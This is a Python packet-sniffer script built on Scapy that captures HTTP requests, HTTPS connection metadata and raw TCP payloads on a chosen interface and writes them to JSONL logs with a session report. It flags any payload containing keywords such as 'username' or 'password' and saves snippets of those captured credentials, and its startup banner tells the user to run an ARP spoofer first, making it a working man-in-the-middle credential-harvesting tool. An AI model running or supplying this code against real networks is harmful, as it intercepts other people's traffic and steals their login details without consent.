import time
from colorama import Fore, Style
import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re
import json
import os
from datetime import datetime
import signal
import sys
from collections import Counter, defaultdict


# ─────────────────────────────────────────────
#  Structured Logger
# ─────────────────────────────────────────────

LOG_FILE = f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jsonl"

def log_event(event_type: str, data: dict):
    """Write a structured JSON log entry to the .jsonl file and print a short console summary."""
    entry = {
        "timestamp": datetime.now().isoformat(),
        "type": event_type,
        **data
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    # Keep a short, color-coded console line so the terminal isn't silent
    _console_echo(event_type, data)


def _console_echo(event_type: str, data: dict):
    """Print a compact one-liner per event — no credential payloads in the terminal."""
    colors = {
        "http_request":      Fore.CYAN,
        "https_metadata":    Fore.MAGENTA,
        "raw_tcp":           Fore.WHITE,
        "credential_alert":  Fore.RED,
        "session_start":     Fore.BLUE,
        "session_end":       Fore.GREEN,
        "rate_alert":        Fore.YELLOW,
    }
    color = colors.get(event_type, Fore.WHITE)

    if event_type == "http_request":
        print(f"{color}[HTTP] {data.get('method')} http://{data.get('host')}{data.get('path')}{Style.RESET_ALL}")
    elif event_type == "https_metadata":
        print(f"{color}[HTTPS] {data.get('src')} --> {data.get('dst')}:443 (encrypted){Style.RESET_ALL}")
    elif event_type == "raw_tcp":
        print(f"{color}[RAW TCP] {data.get('src')}:{data.get('sport')} --> {data.get('dst')}:{data.get('dport')}{Style.RESET_ALL}")
    elif event_type == "credential_alert":
        print(f"{color}[!!!] CREDENTIAL ALERT from {data.get('src')} — see {LOG_FILE} for details{Style.RESET_ALL}")
    elif event_type == "rate_alert":
        print(f"{color}[ALERT] High request rate from {data.get('src')}: {data.get('count')} req/min{Style.RESET_ALL}")
    elif event_type == "session_end":
        print(f"{color}[*] Session ended. Log: {LOG_FILE} | Report: {data.get('report_file')}{Style.RESET_ALL}")


# ─────────────────────────────────────────────
#  Rate-based anomaly detection
# ─────────────────────────────────────────────

request_timestamps = defaultdict(list)   # src_ip -> [epoch timestamps]
RATE_THRESHOLD     = 50                  # requests per 60-second window

def _check_rate(src_ip: str):
    now = time.time()
    window = [t for t in request_timestamps[src_ip] if now - t < 60]
    window.append(now)
    request_timestamps[src_ip] = window
    if len(window) > RATE_THRESHOLD:
        log_event("rate_alert", {"src": src_ip, "count": len(window)})


# ─────────────────────────────────────────────
#  Session statistics (for the final report)
# ─────────────────────────────────────────────

session_stats = {
    "start":              datetime.now().isoformat(),
    "packets_total":      0,
    "http_requests":      0,
    "https_connections":  0,
    "raw_tcp_packets":    0,
    "credential_alerts":  0,
    "ip_counts":          Counter(),
}


# ─────────────────────────────────────────────
#  Core packet processing — replaces old version
# ─────────────────────────────────────────────

def process_sniffed_packet(packet):
    session_stats["packets_total"] += 1

    # ── HTTP (port 80) ──────────────────────────────────────────────────────
    if packet.haslayer(http.HTTPRequest):
        _handle_http(packet)

    # ── HTTPS metadata + raw TCP ────────────────────────────────────────────
    elif packet.haslayer(scapy.all.IP) and packet.haslayer(scapy.all.TCP):
        _handle_tcp(packet)


def _handle_http(packet):
    ip_layer   = packet.getlayer("IP")
    http_layer = packet.getlayer("HTTPRequest")
    src        = ip_layer.fields["src"] if ip_layer else "unknown"

    session_stats["http_requests"] += 1
    session_stats["ip_counts"][src] += 1
    _check_rate(src)

    try:
        method = http_layer.fields["Method"].decode()
        host   = http_layer.fields["Host"].decode()
        path   = http_layer.fields["Path"].decode()
    except Exception:
        method, host, path = "?", "?", "/"

    log_event("http_request", {
        "src":    src,
        "method": method,
        "host":   host,
        "path":   path,
    })

    # Check for credentials in HTTP payload
    creds = _extract_credentials(packet)
    if creds:
        session_stats["credential_alerts"] += 1
        log_event("credential_alert", {
            "src":             src,
            "host":            host,
            "path":            path,
            # Store only a short snippet — avoid logging full credentials in
            # plaintext beyond what's needed for a research/lab context.
            "payload_snippet": creds[:300],
        })


def _handle_tcp(packet):
    ip_layer  = packet[scapy.all.IP]
    tcp_layer = packet[scapy.all.TCP]
    src       = ip_layer.src
    dst       = ip_layer.dst

    session_stats["ip_counts"][src] += 1

    # HTTPS — log metadata only, payload is encrypted
    if tcp_layer.dport == 443:
        session_stats["https_connections"] += 1
        log_event("https_metadata", {
            "src":   src,
            "dst":   dst,
            "dport": tcp_layer.dport,
        })
        return

    # Raw TCP — decode payload if present
    if packet.haslayer(scapy.all.Raw):
        try:
            raw_data = packet[scapy.all.Raw].load.decode("utf-8", errors="ignore")
        except Exception:
            return

        if not raw_data.strip():
            return

        session_stats["raw_tcp_packets"] += 1

        log_event("raw_tcp", {
            "src":          src,
            "dst":          dst,
            "sport":        tcp_layer.sport,
            "dport":        tcp_layer.dport,
            "data_snippet": raw_data[:200],
        })

        # Credential check in raw TCP too
        keywords = ["username", "user", "email", "pass", "login", "password"]
        if any(kw.lower() in raw_data.lower() for kw in keywords):
            session_stats["credential_alerts"] += 1
            log_event("credential_alert", {
                "src":             src,
                "dst":             dst,
                "dport":           tcp_layer.dport,
                "payload_snippet": raw_data[:300],
            })


def _extract_credentials(packet) -> str | None:
    """Return the raw payload string if credential keywords are present, else None."""
    if not packet.haslayer(scapy.all.Raw):
        return None
    try:
        payload = packet[scapy.all.Raw].load.decode("utf-8", errors="ignore")
        keywords = ["username", "user", "email", "pass", "login", "password",
                    "UserName", "Password"]
        if any(kw in payload for kw in keywords):
            return payload
    except Exception:
        pass
    return None


# ─────────────────────────────────────────────
#  Session report — auto-generated on Ctrl+C
# ─────────────────────────────────────────────

def _generate_report():
    session_stats["end"]         = datetime.now().isoformat()
    session_stats["unique_ips"]  = len(session_stats["ip_counts"])
    session_stats["top_talkers"] = session_stats["ip_counts"].most_common(5)

    # Convert Counter to plain dict for JSON serialisation
    report = {**session_stats, "ip_counts": dict(session_stats["ip_counts"])}

    report_file = LOG_FILE.replace(".jsonl", "_report.json")
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2)

    return report_file


def _handle_exit(sig, frame):
    report_file = _generate_report()
    log_event("session_end", {
        "packets_total":     session_stats["packets_total"],
        "credential_alerts": session_stats["credential_alerts"],
        "report_file":       report_file,
    })
    sys.exit(0)

signal.signal(signal.SIGINT, _handle_exit)


# ─────────────────────────────────────────────
#  Interface helpers (unchanged from original)
# ─────────────────────────────────────────────

def get_current_mac(interface):
    try:
        output = subprocess.check_output(["ipconfig", "/all"], shell=True).decode("utf-8")
        mac_search = re.search(
            r"({}[\s\S]*?Physical Address[\s\S]*?[\r\n].*?[\r\n])".format(interface),
            output, re.IGNORECASE
        )
        if mac_search:
            return re.search(
                r"(([0-9a-fA-F]{2}[:-]){5}([0-9a-fA-F]{2}))",
                mac_search.group(1)
            ).group(1)
    except Exception:
        pass
    return None


def get_current_ip(interface):
    try:
        output = subprocess.check_output(["ipconfig", "/all"], shell=True).decode("utf-8")
        ip_search = re.search(
            r"({}[\s\S]*?IPv4 Address[\s\S]*?[\r\n].*?[\r\n])".format(interface),
            output, re.IGNORECASE
        )
        if ip_search:
            return re.search(r"(\d+\.\d+\.\d+\.\d+)", ip_search.group(1)).group(1)
    except Exception:
        pass
    return None


def ip_table():
    addrs = psutil.net_if_addrs()
    t = PrettyTable([f"{Fore.GREEN}Interface", "Mac Address", f"IP Address{Style.RESET_ALL}"])
    for k, v in addrs.items():
        mac = get_current_mac(k)
        ip  = get_current_ip(k)
        if ip and mac:
            t.add_row([k, mac, ip])
        elif mac:
            t.add_row([k, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            t.add_row([k, f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}", ip])
    print(t)


def sniff(interface):
    log_event("session_start", {"interface": interface, "log_file": LOG_FILE})
    print(f"{Fore.BLUE}[*] Capturing TCP traffic on {interface}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Logging to {LOG_FILE} — press Ctrl+C to stop and generate report{Style.RESET_ALL}\n")
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="tcp")


# ─────────────────────────────────────────────
#  Entry point
# ─────────────────────────────────────────────

def main_sniff():
    print(f"{Fore.BLUE}Welcome To Packet Sniffer{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[***] Please Start ARP Spoofer Before Using this Module [***]{Style.RESET_ALL}")
    try:
        ip_table()
        interface = input("[*] Please enter the interface name: ")
        print(f"{Fore.BLUE}[*] Sniffing Packets on {interface}...{Style.RESET_ALL}")
        sniff(interface)
    except KeyboardInterrupt:
        pass  # _handle_exit handles cleanup via signal


main_sniff()